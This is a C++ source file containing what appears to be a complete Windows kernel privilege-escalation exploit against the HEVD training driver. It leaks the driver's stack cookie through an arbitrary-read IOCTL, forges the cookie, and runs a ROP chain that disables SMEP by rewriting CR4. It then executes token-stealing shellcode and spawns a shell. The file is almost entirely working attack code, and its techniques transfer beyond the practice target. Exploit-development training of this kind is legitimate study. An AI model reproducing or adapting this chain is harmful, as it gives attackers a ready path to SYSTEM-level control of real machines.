#include "StackOverflowGS.hpp"

static HANDLE	g_Device = NULL;
static DWORD64	g_StackCookie = 0;

PSTACK GetStackInformation(PSTACK pStack)
{
	wprintf(L"[+] NTDLL module\r\n");
	HMODULE ntdll = GetModuleHandleW(TEXT("ntdll"));
	if (ntdll == NULL)
	{
		wprintf(L"[-] Error GetModuleHandleW\r\n");
		return nullptr;
	}

	wprintf(L"[+] Rtl unicode string\r\n");
	PRtlInitUnicodeString _RtlInitUnicodeString = (PRtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
	PRtlEqualUnicodeString _RtlEqualUnicodeString = (PRtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");
	if (_RtlInitUnicodeString == NULL || _RtlEqualUnicodeString == NULL) 
	{
		wprintf(L"[-] Error unicode string\r\n");
		return nullptr;
	}

	PNtQuerySystemInformation _NtQuerySystemInfomation = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (_NtQuerySystemInfomation == NULL) 
	{
		wprintf(L"[-] Error _NtQuerySystemInfomation\r\n");
		return nullptr;
	}

	wprintf(L"[+] NtQuerySystemInfo\r\n");
	ULONG len = 2000;
	NTSTATUS status = NULL;
	PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
	do {
		len *= 2;
		pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
		status = _NtQuerySystemInfomation(SystemExtendedProcessInformation, pProcessInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) 
	{
		wprintf(L"Error NtQuerySystemInformation pProcessInfo");
		return nullptr;
	}

	wprintf(L"[+] Find proc\r\n");
	UNICODE_STRING targetProc = { 0 };
	_RtlInitUnicodeString(&targetProc, L"HEVDExploit.exe");
	// ±éÀú£¬Ñ°ÕÒ
	wprintf(L"[+] Iterating for kernel stack address\r\n");
	PVOID stackLimit = NULL;
	while (pProcessInfo != NULL) 
	{
		if (_RtlEqualUnicodeString(&(pProcessInfo->ImageName), &targetProc, TRUE)) 
		{
			printf("[*] Process: %wZ\n", pProcessInfo->ImageName);
			for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) 
			{
				pStack->StackBase = (DWORD64)pProcessInfo->Threads[i].StackBase;
				pStack->StackLimit = (DWORD64)pProcessInfo->Threads[i].StackLimit;
				wprintf(L"\tStack base 0x%llx\n", pStack->StackBase);
				wprintf(L"\tStack limit 0x%llx\n", pStack->StackLimit);
				break;
			}
		}

		if (!pProcessInfo->NextEntryOffset) 
		{
			pProcessInfo = NULL;
		}
		else 
		{
			pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
		}
	}

	GlobalFree(pProcessInfo);
	return pStack;
}

DWORD64 GetStackCookie()
{
	DWORD64 dwHevdModule = GetModuleBase(L"HEVD.sys");
	DWORD64 dwStackCookie = dwHevdModule + 0x3010;
	WHAT_WHERE ww = { 0 };
	ww.What.Read = dwStackCookie;
	ww.Where.OutValue = (DWORD64)&g_StackCookie;
	ReadWhere(ww);
	return g_StackCookie;
}

DWORD64 ReadWhere(WHAT_WHERE& ww)
{
	DWORD dwBytesReturn;
	DeviceIoControl(g_Device, IOCTL_WHAT_TO_WHERE, &ww, sizeof(ww), NULL, 0, &dwBytesReturn, NULL);
	return ww.Where.OutValue;
}

VOID WriteWhere(WHAT_WHERE& ww)
{

}

VOID StackOverflowGSExploit()
{
	DWORD dwBytesReturn;
	STACK s;
	RtlZeroMemory(&s, sizeof(s));

	wprintf(L"[+] Open device\r\n");
	g_Device = CreateFileW(
		TEXT(DEVICE_LINK_NAME),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (g_Device == INVALID_HANDLE_VALUE)
	{
		Error("open device");
	}


	wprintf(L"[+] GetStackCookie \r\n");
	GetStackCookie();
	wprintf(L"StackCookie: %#llx\r\n", g_StackCookie);
	

	wprintf(L"[+] GetStackInformation \r\n");
	GetStackInformation(&s);

	DWORD64 rsp = s.StackBase + 0x54b0;
	wprintf(L"rsp: %#llx\r\n", rsp);

	wprintf(L"[+] Trigger StackOverflow GS \r\n");
	DWORD64 ntBase = GetModuleBase(TEXT("ntoskrnl.exe"));
	LPVOID lpBuffer = VirtualAlloc(NULL, 0x268, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	LPVOID lpShellcode = VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// 0x00000000003a0a67: mov cr4, rcx; ret;
	DWORD64 MOV_CR4_RCX = ntBase + 0x00000000003a0a67;
	// 0x00000000002148c8: pop rcx; ret;
	DWORD64 POP_RCX_RET = ntBase + 0x00000000002148c8;
	if (lpBuffer == NULL)
	{
		Error("VirtualAlloc");
	}

	RtlFillMemory(lpBuffer, 0x268, 0x43);
	RtlCopyMemory(lpShellcode, StealToken, 0x100);

	PDWORD64 cookie = (PDWORD64)((DWORD64)lpBuffer + 0x200);
	*cookie = (rsp ^ g_StackCookie);

	PDWORD64 rop = (PDWORD64)((DWORD64)lpBuffer + 0x238);
	*rop++ = POP_RCX_RET;
	*rop++ = 0x350ef8 ^ 1UL << 20;
	*rop++ = MOV_CR4_RCX;
	*rop++ = (DWORD64)lpShellcode;

	DeviceIoControl(g_Device, IOCTL_STACK_OVERFLOW_GS, lpBuffer, 0x268, NULL, 0, &dwBytesReturn, NULL);

	SpawnShell();
	wprintf(L"[+] Close device\r\n");
	VirtualFree(lpBuffer, 0, MEM_RELEASE);
	VirtualFree(lpShellcode, 0, MEM_RELEASE);
	CloseHandle(g_Device);
}